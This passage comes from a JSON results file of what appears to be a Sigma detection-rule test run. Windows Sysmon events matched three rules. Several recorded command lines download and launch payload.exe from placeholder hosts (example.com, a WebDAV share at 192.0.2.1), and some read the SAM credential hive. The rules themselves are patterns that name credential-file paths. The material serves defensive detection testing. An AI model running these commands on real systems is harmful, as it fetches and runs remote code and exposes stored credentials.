      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:20:54.797977Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:20:54.789",
      "Version": 5
    },
    {
      "row_id": 223,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 208318,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_508.evtx",
      "ParentCommandLine": "cmd.exe /V:oN /c \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E309-6A2E-330F-000000002C00",
      "ParentProcessId": 8736,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E309-6A2E-340F-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:21:13.037239Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:21:13.034",
      "Version": 5
    },
    {
      "row_id": 225,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 208371,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_509.evtx",
      "ParentCommandLine": "cmd.exe /v:on /c \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E320-6A2E-4D0F-000000002C00",
      "ParentProcessId": 5844,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E321-6A2E-4E0F-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:21:37.079716Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:21:37.074",
      "Version": 5
    },
    {
      "row_id": 229,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 208465,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_511.evtx",
      "ParentCommandLine": "cmd.exe /v:ON /C \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E34C-6A2E-7B0F-000000002C00",
      "ParentProcessId": 11284,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E34C-6A2E-7C0F-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:22:20.889852Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:22:20.885",
      "Version": 5
    }
  ]
},
{
  "title": "Copying Sensitive Files with Credential Data",
  "id": "e7be6119-fc37-43f0-ad4f-1f3f99be2f9f",
  "description": "Files with well-known filenames (sensitive files with credential data) copying",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (((Image LIKE '%\\\\esentutl.exe' ESCAPE '\\' OR OriginalFileName LIKE '\\\\esentutl.exe' ESCAPE '\\') AND (CommandLine LIKE '%vss%' ESCAPE '\\' OR CommandLine LIKE '% -m %' ESCAPE '\\' OR CommandLine LIKE '% /m %' ESCAPE '\\' OR CommandLine LIKE '% –m %' ESCAPE '\\' OR CommandLine LIKE '% —m %' ESCAPE '\\' OR CommandLine LIKE '% ―m %' ESCAPE '\\' OR CommandLine LIKE '% -y %' ESCAPE '\\' OR CommandLine LIKE '% /y %' ESCAPE '\\' OR CommandLine LIKE '% –y %' ESCAPE '\\' OR CommandLine LIKE '% —y %' ESCAPE '\\' OR CommandLine LIKE '% ―y %' ESCAPE '\\')) OR (CommandLine LIKE '%\\\\config\\\\RegBack\\\\sam%' ESCAPE '\\' OR CommandLine LIKE '%\\\\config\\\\RegBack\\\\security%' ESCAPE '\\' OR CommandLine LIKE '%\\\\config\\\\RegBack\\\\system%' ESCAPE '\\' OR CommandLine LIKE '%\\\\config\\\\sam%' ESCAPE '\\' OR CommandLine LIKE '%\\\\config\\\\security%' ESCAPE '\\' OR CommandLine LIKE '%\\\\config\\\\system %' ESCAPE '\\' OR CommandLine LIKE '%\\\\repair\\\\sam%' ESCAPE '\\' OR CommandLine LIKE '%\\\\repair\\\\security%' ESCAPE '\\' OR CommandLine LIKE '%\\\\repair\\\\system%' ESCAPE '\\' OR CommandLine LIKE '%\\\\windows\\\\ntds\\\\ntds.dit%' ESCAPE '\\')))"
  ],
  "rule_level": "high",
  "tags": [
    "attack.credential-access",
    "attack.t1003.002",
    "attack.t1003.003",
    "car.2013-07-001",
    "attack.s0404"
  ],
  "count": 2,
  "matches": [
    {
      "row_id": 60,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"type C:\\Windows\\System32\\config\\SAM\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 214050,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1018__t1018_073.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F18B-6A2E-641A-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T18:23:07.731366Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:23:07.727",
      "Version": 5
    },
    {
      "row_id": 61,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /\"c\" \"type C:\\Windows\\System32\\config\\SAM\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 214094,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1018__t1018_074.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F19D-6A2E-7A1A-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T18:23:25.626511Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:23:25.622",
      "Version": 5
    }
  ]
},
{
  "title": "Windows Internet Hosted WebDav Share Mount Via Net.EXE",
  "id": "7e6237fe-3ddb-438f-9381-9bf9de5af8d0",
  "description": "Detects when an internet hosted webdav share is mounted using the \"net.exe\" utility",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (((Image LIKE '%\\\\net.exe' ESCAPE '\\' OR Image LIKE '%\\\\net1.exe' ESCAPE '\\') OR (OriginalFileName='net.exe' OR OriginalFileName='net1.exe')) AND (CommandLine LIKE '% use %' ESCAPE '\\' AND CommandLine LIKE '% http%' ESCAPE '\\')))"
  ],
  "rule_level": "high",
  "tags": [
    "attack.lateral-movement",
    "attack.t1021.002"
  ],
  "count": 2,
  "matches": [
    {
      "row_id": 136,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "net  use https://192.0.2.1/share ",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Net Command",
      "EventID": 1,
      "EventRecordID": 203874,
      "FileVersion": "10.0.26100.7019 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=8A1E71312BD2AAE202652113049CDBD1,SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75",
      "IMPHASH": "EF46B86C2346DA0A991DE4B78AAF4E75",
      "Image": "C:\\Windows\\System32\\net.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "8A1E71312BD2AAE202652113049CDBD1",
      "Opcode": 0,
      "OriginalFileName": "net.exe",
      "OriginalLogfile": "t1059.001__t1059.001_034.evtx",
      "ParentCommandLine": "cmd.exe /c \" net use https://192.0.2.1/share & start \\\\192.0.2.1\\DavWWWRoot\\payload.exe \"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D50C-6A2E-7F06-000000002C00",
      "ParentProcessId": 4136,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D50C-6A2E-8006-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777",
      "SystemTime": "2026-06-14T16:21:32.910287Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:21:32.902",
      "Version": 5
    },
    {
      "row_id": 138,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "net  use https://192.0.2.1/share ",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Net Command",
      "EventID": 1,
      "EventRecordID": 203924,
      "FileVersion": "10.0.26100.7019 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=8A1E71312BD2AAE202652113049CDBD1,SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75",
      "IMPHASH": "EF46B86C2346DA0A991DE4B78AAF4E75",
      "Image": "C:\\Windows\\System32\\net.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "8A1E71312BD2AAE202652113049CDBD1",
      "Opcode": 0,
      "OriginalFileName": "net.exe",
      "OriginalLogfile": "t1059.001__t1059.001_035.evtx",
      "ParentCommandLine": "cmd.exe /C \" net use https://192.0.2.1/share & start \\\\192.0.2.1\\DavWWWRoot\\payload.exe \"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D53C-6A2E-9806-000000002C00",
      "ParentProcessId": 5888,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D53C-6A2E-9906-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777",
      "SystemTime": "2026-06-14T16:22:20.182267Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:22:20.173",
      "Version": 5
    }
  ]
},
